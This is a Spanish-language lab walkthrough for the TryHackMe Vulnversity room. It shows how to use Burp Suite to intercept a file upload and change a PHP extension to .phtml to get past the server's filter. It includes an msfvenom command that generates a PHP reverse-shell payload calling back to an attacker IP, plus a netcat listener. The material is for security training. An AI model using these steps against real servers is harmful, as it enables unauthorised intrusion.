Maquinas a utilizar **Kali Linux y Laboratorio de Try Hack Me Vulnversity** [https://tryhackme.com/room/vulnversity](https://tryhackme.com/room/vulnversity)

Vamos a aprender a **utilizar burp suite**, el cual consiste en una herramienta enfocada al hacking web que actúa como proxy entre el navegador y el servidor web, de tal forma que podremos interceptar las peticiones y realizar distintos tipos de ataques.

  

Escribimos en el navegador web la siguiente URL cambiando por supuesto la IP por la que corresponda en ese momento a la maquina victima.

`http://10.10.93.207:3333/internal/`

![[Imagenes/image 35.png|image 35.png]]

Vemos que desde aquí podemos subir archivos. Como ya vimos con anterioridad para subir un archivo con extensión PHP tuvimos que cambiarle la extensión ya que PHP no estaba permitida. Ahora aprenderemos otro forma de hacerlo sin cambiar la extensión del archivo utilizando BurpSuite para interceptar la petición y modificar lo que queramos.

  

- Vamos a aplicar antes de nada un pequeño ajuste dentro del navegador web.
    
    **Ajustes → Settings**
    
    ![[Imagenes/image 1 24.png|image 1 24.png]]
    

**General→ Network Settings**

![[Imagenes/image 2 23.png|image 2 23.png]]

**Manual proxy configuration**

**HTTP Proxy: 127.0.0.1 Port: 8080**

![[Imagenes/image 3 22.png|image 3 22.png]]

  

- Nos creamos un archivo malicioso con extensión PHP
    
    ```Bash
    msfvenom -p php/reverse_php LHOST=10.21.166.149 LPORT=443 -f raw > pwned2.php 
    ```
    
    ![[Imagenes/image 4 21.png|image 4 21.png]]
    

  

- En **BurpSuite** nos vamos a la **pestaña Proxy** y pulsamos **intercept on** para activarla.
    
    ![[Imagenes/image 5 20.png|image 5 20.png]]
    

  

- Vamos a intentar subir el archivo malicioso PHP.
    
    ![[Imagenes/image 6 18.png|image 6 18.png]]
    

  

- Nos salta BurpSuite y nos muestra la petición interceptada (esta petición nunca a llegado al servidor BurpSuite la tiene retenida) y yo puedo cambiar lo que me interese de ella.
    
    ![[Imagenes/image 7 16.png|image 7 16.png]]
    

A mi me interesa cambiar el nombre del archivo en la petición de extensión PHP.

![[Imagenes/image 8 15.png|image 8 15.png]]

  

a extensión **PHTML** para que crea que tiene una extensión que en realidad no la tiene.

![[Imagenes/image 9 14.png|image 9 14.png]]

  

- Pulsamos **Forward** para dejar seguir la petición que hemos modificado.
    
    ![[Imagenes/image 10 14.png|image 10 14.png]]
    

Vemos que se a subido correctamente a pesar de ser un archivo con extensión php.

![[Imagenes/image 11 11.png|image 11 11.png]]

- Desconectamos la interceptación en BurpSuite y volvemos a dejar como estaban los ajustes de navegador web.
    
    ![[Imagenes/image 12 11.png|image 12 11.png]]
    
    ![[Imagenes/image 13 11.png|image 13 11.png]]
    

  

- Nos vamos a la ruta donde se encuentran los archivos subidos. Y vemos que ya tenemos el archivo en el servidor. `http://10.10.58.163:3333/internal/uploads/`
    
    ![[Imagenes/image 14 9.png|image 14 9.png]]
    

Vemos que aquí no muestra como php si no como phtml , esto es por que el cree que es phtml.

  

- Nos ponemos a la escucha con netcat.
    
    ```Bash
    nc -nlvp 443
    ```
    
    ![[Imagenes/image 15 8.png|image 15 8.png]]
    

  

- Ejecutamos el archivo malicioso y recibimos la conexión y nos encontramos dentro de la maquina. Pero esta vez utilizando BuspSuite. Recordemos que intentemos estabilizar la conexión ya que msfvomon es muy inestable.
    
    ![[Imagenes/image 16 5.png|image 16 5.png]]